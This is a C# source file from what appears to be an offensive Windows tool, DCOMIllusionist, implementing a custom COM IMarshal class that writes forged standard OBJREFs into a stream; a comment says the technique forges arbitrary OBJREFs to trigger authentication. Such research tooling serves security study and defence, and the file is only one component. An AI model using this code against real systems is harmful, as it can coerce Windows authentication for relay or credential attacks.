using DCOMIllusionist.Core.COM.Marshalling;
using DCOMIllusionist.Core.Interop.Interfaces;
using System;
using System.Runtime.InteropServices;

namespace DCOMIllusionist.Core.COM.Marshaling
{
    [ComVisible(true)]
    [Serializable]
    public  class StdMarshaller: IMarshal
    {
        public object SobjRef { get; set; }

        public StdMarshaller(object SobjRef = null)
        {
            this.SobjRef = SobjRef;
        }

        public void GetUnmarshalClass(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out Guid pCid)
        {
            /*
             * Using the GUID of the standard marshaller allows us to forge arbitrary OBJREFs.
             * In the original research, the arbitrary OBJREF was wrapped within a custom OBJREF.
             * This approach successfully triggered authentication, but failed later due to a casting error.
             */
            pCid = Interop.COMKnownGuids.CLSID_StdMarshal;
        }

        public void GetMarshalSizeMax(ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS, out uint pSize)
        {
            pSize = 1024;
        }

        public void MarshalInterface(Interop.Interfaces.IStream pstm, ref Guid riid, IntPtr pv, uint dwDestContext, IntPtr pvDestContext, uint MSHLFLAGS)
        {
            uint written;
            var data = ((COMObjRefStandard)SobjRef).ToArray();
            pstm.Write(data, (uint)data.Length, out written);
        }

        public void UnmarshalInterface(Interop.Interfaces.IStream pstm, ref Guid riid, out IntPtr ppv)
        {
            ppv = IntPtr.Zero;
        }

        public void ReleaseMarshalData(Interop.Interfaces.IStream pstm)
        {
        }

        public void DisconnectObject(uint dwReserved)
        {
        }
    }
}